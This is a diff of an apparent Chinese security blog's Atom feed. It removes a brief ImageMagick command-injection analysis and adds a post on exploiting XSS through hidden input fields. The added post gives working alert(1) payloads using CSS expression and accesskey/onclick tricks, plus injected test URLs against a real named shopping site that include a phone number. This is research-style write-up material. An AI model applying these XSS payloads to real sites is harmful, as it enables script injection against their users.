@@ -168,24 +168,6 @@ private <span class="keyword">function</span> base_class(<span class="variable">
   </entry>
   
   <entry>
-    <title><![CDATA[imagemagic RCE漏洞分析与利用]]></title>
-    <link href="http://xdxd.love/2016/05/05/imagemagic-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
-    <id>http://xdxd.love/2016/05/05/imagemagic-RCE漏洞分析与利用/</id>
-    <published>2016-05-05T08:20:21.000Z</published>
-    <updated>2016-05-09T02:58:04.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>目前的分析讲的比较清楚了。概括来讲imagemagic允许使用外部库处理图片。这个特性叫做delegate。通过使用system()调用命令行来实现的。命令预先配置在delegates.xml中。接受输入图片参数再完成最后的命令拼接。就是拼接命令的过程，出现了命令注入的漏洞。</p>
-<h1 id="代码分析">代码分析</h1><p>使用正常png图片执行命令。</p>
-<h1 id="参考资料">参考资料</h1><p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a><br><a href="http://drops.wooyun.org/papers/15589" target="_blank" rel="external">http://drops.wooyun.org/papers/15589</a><br><a href="http://360adlab.com/?p=1895" target="_blank" rel="external">http://360adlab.com/?p=1895</a><br><a href="http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1" target="_blank" rel="external">http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1</a><br><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">https://github.com/ImageTragick/PoCs</a><br><a href="http://weibo.com/p/1001603971443670055277" target="_blank" rel="external">http://weibo.com/p/1001603971443670055277</a></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>目前的分析讲的比较清楚了。概括来讲imagemagic允许使用外部库处理图片。这个特性叫做delegate。通过使用system()调用命令行来实现的。命令预先配置在delegates.xml中。接受输入图片参数再完成最后的命令]]>
-    </summary>
-    
-      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[2016 CCTF writeup之萝莉之旅]]></title>
     <link href="http://xdxd.love/2016/05/03/2016-CCTF%E4%B9%8B%E8%90%9D%E8%8E%89%E4%B9%8B%E6%97%85/"/>
     <id>http://xdxd.love/2016/05/03/2016-CCTF之萝莉之旅/</id>
@@ -1068,6 +1050,44 @@ class <sp]]>
       <category term="python" scheme="http://xdxd.love/tags/python/"/>
     
       <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[input标签type为hidden时的xss利用]]></title>
+    <link href="http://xdxd.love/2016/01/20/input%E6%A0%87%E7%AD%BEtype%E4%B8%BAhidden%E6%97%B6%E7%9A%84xss%E5%88%A9%E7%94%A8/"/>
+    <id>http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/</id>
+    <published>2016-01-20T06:05:01.000Z</published>
+    <updated>2016-01-20T06:45:54.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> name=<span class="string">"redacted"</span> value=<span class="string">"default"</span> injection=<span class="string">"xss"</span> /&gt;
+</code></pre><h1 id="结论">结论</h1><p>在某些条件下是可以执行javascript的，但是比较鸡肋。资料收集的结论就是利用价值极低。</p>
+<h1 id="利用方式">利用方式</h1><p>1，如果输出是在type=”hidden”之前，直接覆盖type，就变成了一个常规的xss。这个情况比较少见。</p>
+<p>2，建立两个HTML文件，one.htm</p>
+<pre><code><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">two.htm</span>&gt;</span>
+</code></pre><p>two.htm</p>
+<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
+</code></pre><p>测试于IE6-9 可以弹。</p>
+<p>3，firefox使用键盘交互的方式。</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"hidden"</span> accesskey=<span class="string">"X"</span> onclick=<span class="string">"alert(1)"</span>&gt;
+</code></pre><p> Only works on Firefox. ALT+SHIFT+X on Windows/Linux, CTRL+ALT+X osx.</p>
+<p>4,使用expression</p>
+<p>IE6下</p>
+<pre><code>&lt;<span class="tag">input</span> type=hidden style=x:<span class="function"><span class="title">expression</span><span class="params">(alert(<span class="number">1</span>)</span></span>)&gt;
+</code></pre><h1 id="实例测试">实例测试</h1><pre><code><span class="keyword">http</span>://m.yohobuy.com/passport//back//backcode?phoneNum=15381187741&amp;token=a<span class="number">%20</span>accesskey=X<span class="number">%20</span>onclick=alert<span class="number">%281</span><span class="number">%29</span>&amp;areaCode=8
+</code></pre><p><img src="/images/inputhidden1.png" alt=""></p>
+<pre><code>http:<span class="regexp">//m</span>.yohobuy.com/passport//back//backcode?phoneNum=<span class="number">15381187741</span>&amp;token=e6fd9<span class="variable">%20style</span><span class="variable">%3dx</span><span class="variable">%3aexpr</span><span class="variable">%2f</span>**<span class="variable">%2fession</span>(<span class="keyword">open</span>(alert(<span class="number">1</span>)))<span class="variable">%20e6fd9</span>&amp;areaCode=<span class="number">8</span>
+</code></pre><p><img src="/images/inputhidden2.png" alt=""></p>
+<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/9856" target="_blank" rel="external">http://zone.wooyun.org/content/9856</a><br><a href="http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html" target="_blank" rel="external">http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="问题场景">问题场景</h1><p>有时候会遇到这个场景的XSS，输出在input标签的value里，可以引入双引号，所以可以引入新的属性。但是type是hidden。导致常规的一些事件没法利用。</p>
+<pre><code>&lt;input <span cl]]>
+    </summary>
+    
+      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
+    
+      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
